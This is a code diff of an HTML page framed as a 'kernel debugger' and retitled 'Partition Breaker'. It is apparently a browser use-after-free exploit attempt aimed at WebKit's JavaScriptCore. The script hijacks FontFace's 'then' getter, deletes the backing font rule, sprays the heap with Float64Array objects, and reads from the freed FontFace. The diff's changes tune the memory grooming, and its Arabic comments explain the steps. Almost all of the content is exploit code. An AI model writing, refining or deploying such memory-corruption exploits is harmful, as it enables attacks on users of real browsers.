@@ -2,13 +2,13 @@
 <html>
 <head>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
         #console { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; background: #0a0a0a; }
-        .log { margin-bottom: 5px; border-bottom: 1px solid #222; }
+        .log { margin-bottom: 5px; }
     </style>
 </head>
 <body>
-    <h3>JANUS_KERNEL_DEBUGGER v1.0</h3>
+    <h3>JANUS_KERNEL_DEBUGGER v1.1 - [Partition Breaker]</h3>
     <div id="console"></div>
 
     <script>
@@ -19,38 +19,36 @@
         };
 
         window.onload = () => {
-            log("INITIALIZING_MEMORY_TEST...");
+            log("INITIALIZING_MEMORY_Grooming...");
             let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             
-            let callbackCount = 0;
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
                     if (this === A) {
-                        callbackCount++;
-                        if (callbackCount === 1) {
-                            log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
-                            document.getElementById('s').sheet.deleteRule(0);
-                            
-                            log("[+] SPRAYING_DOM_OBJECTS...");
-                            for (let i = 0; i < 300; i++) {
-                                let el = document.createElement('div');
-                                el.id = "SPRAY_" + i;
-                                document.body.appendChild(el);
-                            }
-
-                            setTimeout(() => {
-                                try {
-                                    log("[?] ATTEMPTING_DEREFERENCE_READ...");
-                                    let val = A.family;
-                                    log("<span style='color: cyan;'>[SUCCESS] READ_VALUE: " + val + "</span>");
-                                    log("[INFO] Heap stability achieved.");
-                                } catch(e) {
-                                    log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
-                                }
-                            }, 100);
+                        log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
+                        document.getElementById('s').sheet.deleteRule(0);
+                        
+                        log("[+] SPRAYING_JSC_OBJECTS (Float64Array)...");
+                        let spray = [];
+                        for (let i = 0; i < 500; i++) {
+                            // تخصيص ذاكرة داخل مسبح الـ JSC
+                            let arr = new Float64Array(32); 
+                            arr[0] = 1.1; // بصمة رقمية للتداخل
+                            spray.push(arr);
                         }
+
+                        setTimeout(() => {
+                            try {
+                                log("[?] ATTEMPTING_DEREFERENCE...");
+                                // محاولة القراءة من الكائن المحرر
+                                let val = A.family; 
+                                log("[SUCCESS] READ: " + val);
+                            } catch(e) {
+                                log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
+                            }
+                        }, 50);
                     }
                     return undefined;
                 }
